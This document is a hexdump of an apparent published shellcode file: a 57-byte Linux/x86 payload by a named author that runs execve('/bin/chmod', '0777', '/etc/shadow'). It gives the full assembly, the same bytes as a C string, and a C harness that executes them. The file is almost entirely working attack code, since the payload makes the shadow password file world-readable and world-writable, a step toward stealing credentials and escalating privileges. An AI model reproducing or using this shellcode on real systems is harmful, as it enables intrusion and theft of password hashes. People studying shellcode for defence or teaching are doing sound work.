00000000  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000030  2a 2a 2a 2a 2a 0d 0a 2a  20 4c 69 6e 75 78 2f 78  |*****..* Linux/x|
00000040  38 36 20 65 78 65 63 76  65 2d 63 68 6d 6f 64 20  |86 execve-chmod |
00000050  30 37 37 37 20 2f 65 74  63 2f 73 68 61 64 6f 77  |0777 /etc/shadow|
00000060  20 20 35 37 20 62 79 74  65 73 20 2a 0d 0a 2a 2a  |  57 bytes *..**|
00000070  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000000a0  2a 2a 2a 0d 0a 2a 20 41  75 74 68 6f 72 3a 20 48  |***..* Author: H|
000000b0  61 6d 7a 61 20 4d 65 67  61 68 65 64 20 20 20 20  |amza Megahed    |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000d0  20 20 20 20 20 20 20 20  20 2a 0d 0a 2a 2a 2a 2a  |         *..****|
000000e0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000110  2a 0d 0a 2a 20 54 77 69  74 74 65 72 3a 20 40 48  |*..* Twitter: @H|
00000120  61 6d 7a 61 5f 4d 65 67  61 20 20 20 20 20 20 20  |amza_Mega       |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000140  20 20 20 20 20 20 20 2a  0d 0a 2a 2a 2a 2a 2a 2a  |       *..******|
00000150  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000170  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 0d  |***************.|
00000180  0a 2a 20 62 6c 6f 67 3a  20 68 61 6d 7a 61 2d 6d  |.* blog: hamza-m|
00000190  65 67 61 5b 64 6f 74 5d  62 6c 6f 67 73 70 6f 74  |ega[dot]blogspot|
000001a0  5b 64 6f 74 5d 63 6f 6d  20 20 20 20 20 20 20 20  |[dot]com        |
000001b0  20 20 20 20 20 2a 0d 0a  2a 2a 2a 2a 2a 2a 2a 2a  |     *..********|
000001c0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000001e0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 0d 0a 2a  |*************..*|
000001f0  20 45 2d 6d 61 69 6c 3a  20 68 61 6d 7a 61 5b 64  | E-mail: hamza[d|
00000200  6f 74 5d 6d 65 67 61 68  65 64 5b 61 74 5d 67 6d  |ot]megahed[at]gm|
00000210  61 69 6c 5b 64 6f 74 5d  63 6f 6d 20 20 20 20 20  |ail[dot]com     |
00000220  20 20 20 2a 0d 0a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |   *..**********|
00000230  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000250  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 0d 0a 0d 0a 78  |***********....x|
00000260  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0d  |or    %eax,%eax.|
00000270  0a 70 75 73 68 20 20 20  25 65 61 78 0d 0a 70 75  |.push   %eax..pu|
00000280  73 68 6c 20 20 24 30 78  37 37 36 66 36 34 36 31  |shl  $0x776f6461|
00000290  0d 0a 70 75 73 68 6c 20  20 24 30 78 36 38 37 33  |..pushl  $0x6873|
000002a0  32 66 32 66 0d 0a 70 75  73 68 6c 20 20 24 30 78  |2f2f..pushl  $0x|
000002b0  36 33 37 34 36 35 32 66  0d 0a 6d 6f 76 6c 20 20  |6374652f..movl  |
000002c0  20 25 65 73 70 2c 25 65  73 69 0d 0a 70 75 73 68  | %esp,%esi..push|
000002d0  20 20 20 25 65 61 78 0d  0a 70 75 73 68 6c 20 20  |   %eax..pushl  |
000002e0  24 30 78 33 37 33 37 33  37 33 30 0d 0a 6d 6f 76  |$0x37373730..mov|
000002f0  6c 20 20 20 25 65 73 70  2c 25 65 62 70 0d 0a 70  |l   %esp,%ebp..p|
00000300  75 73 68 20 20 20 25 65  61 78 0d 0a 70 75 73 68  |ush   %eax..push|
00000310  6c 20 20 24 30 78 36 34  36 66 36 64 36 38 0d 0a  |l  $0x646f6d68..|
00000320  70 75 73 68 6c 20 20 24  30 78 36 33 32 66 36 65  |pushl  $0x632f6e|
00000330  36 39 0d 0a 70 75 73 68  6c 20 20 24 30 78 36 32  |69..pushl  $0x62|
00000340  32 66 32 66 32 66 0d 0a  6d 6f 76 20 20 20 20 25  |2f2f2f..mov    %|
00000350  65 73 70 2c 25 65 62 78  0d 0a 70 75 73 68 6c 20  |esp,%ebx..pushl |
00000360  20 25 65 61 78 0d 0a 70  75 73 68 6c 20 20 25 65  | %eax..pushl  %e|
00000370  73 69 0d 0a 70 75 73 68  6c 20 20 25 65 62 70 0d  |si..pushl  %ebp.|
00000380  0a 70 75 73 68 6c 20 20  25 65 62 78 0d 0a 6d 6f  |.pushl  %ebx..mo|
00000390  76 6c 20 20 20 25 65 73  70 2c 25 65 63 78 0d 0a  |vl   %esp,%ecx..|
000003a0  6d 6f 76 20 20 20 20 25  65 61 78 2c 25 65 64 78  |mov    %eax,%edx|
000003b0  0d 0a 6d 6f 76 20 20 20  20 24 30 78 62 2c 25 61  |..mov    $0xb,%a|
000003c0  6c 0d 0a 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |l..int    $0x80.|
000003d0  0a 0d 0a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |...*************|
000003e0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
000003f0  2a 2a 2a 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |***..#include <s|
00000400  74 64 69 6f 2e 68 3e 0d  0a 23 69 6e 63 6c 75 64  |tdio.h>..#includ|
00000410  65 20 3c 73 74 72 69 6e  67 2e 68 3e 0d 0a 20 0d  |e <string.h>.. .|
00000420  0a 63 68 61 72 20 2a 73  68 65 6c 6c 63 6f 64 65  |.char *shellcode|
00000430  20 3d 20 0d 0a 22 5c 78  33 31 5c 78 63 30 5c 78  | = .."\x31\xc0\x|
00000440  35 30 5c 78 36 38 5c 78  36 31 5c 78 36 34 5c 78  |50\x68\x61\x64\x|
00000450  36 66 5c 78 37 37 5c 78  36 38 5c 78 32 66 5c 78  |6f\x77\x68\x2f\x|
00000460  32 66 5c 78 37 33 22 0d  0a 22 5c 78 36 38 5c 78  |2f\x73".."\x68\x|
00000470  36 38 5c 78 32 66 5c 78  36 35 5c 78 37 34 5c 78  |68\x2f\x65\x74\x|
00000480  36 33 5c 78 38 39 5c 78  65 36 5c 78 35 30 5c 78  |63\x89\xe6\x50\x|
00000490  36 38 5c 78 33 30 5c 78  33 37 22 0d 0a 22 5c 78  |68\x30\x37".."\x|
000004a0  33 37 5c 78 33 37 5c 78  38 39 5c 78 65 35 5c 78  |37\x37\x89\xe5\x|
000004b0  35 30 5c 78 36 38 5c 78  36 38 5c 78 36 64 5c 78  |50\x68\x68\x6d\x|
000004c0  36 66 5c 78 36 34 5c 78  36 38 5c 78 36 39 22 0d  |6f\x64\x68\x69".|
000004d0  0a 22 5c 78 36 65 5c 78  32 66 5c 78 36 33 5c 78  |."\x6e\x2f\x63\x|
000004e0  36 36 5c 78 36 38 5c 78  32 66 5c 78 36 32 5c 78  |66\x68\x2f\x62\x|
000004f0  38 39 5c 78 65 33 5c 78  35 30 5c 78 35 36 5c 78  |89\xe3\x50\x56\x|
00000500  35 35 22 0d 0a 22 5c 78  35 33 5c 78 38 39 5c 78  |55".."\x53\x89\x|
00000510  65 31 5c 78 38 39 5c 78  63 32 5c 78 62 30 5c 78  |e1\x89\xc2\xb0\x|
00000520  30 62 5c 78 63 64 5c 78  38 30 3b 22 3b 0d 0a 0d  |0b\xcd\x80;";...|
00000530  0a 0d 0a 0d 0a 20 0d 0a  69 6e 74 20 6d 61 69 6e  |..... ..int main|
00000540  28 76 6f 69 64 29 0d 0a  7b 0d 0a 66 70 72 69 6e  |(void)..{..fprin|
00000550  74 66 28 73 74 64 6f 75  74 2c 22 4c 65 6e 67 74  |tf(stdout,"Lengt|
00000560  68 3a 20 25 64 5c 6e 22  2c 73 74 72 6c 65 6e 28  |h: %d\n",strlen(|
00000570  73 68 65 6c 6c 63 6f 64  65 29 29 3b 0d 0a 28 2a  |shellcode));..(*|
00000580  28 76 6f 69 64 28 2a 29  28 29 29 20 73 68 65 6c  |(void(*)()) shel|
00000590  6c 63 6f 64 65 29 28 29  3b 0d 0a 72 65 74 75 72  |lcode)();..retur|
000005a0  6e 20 30 3b 0d 0a 7d                              |n 0;..}|
000005a7
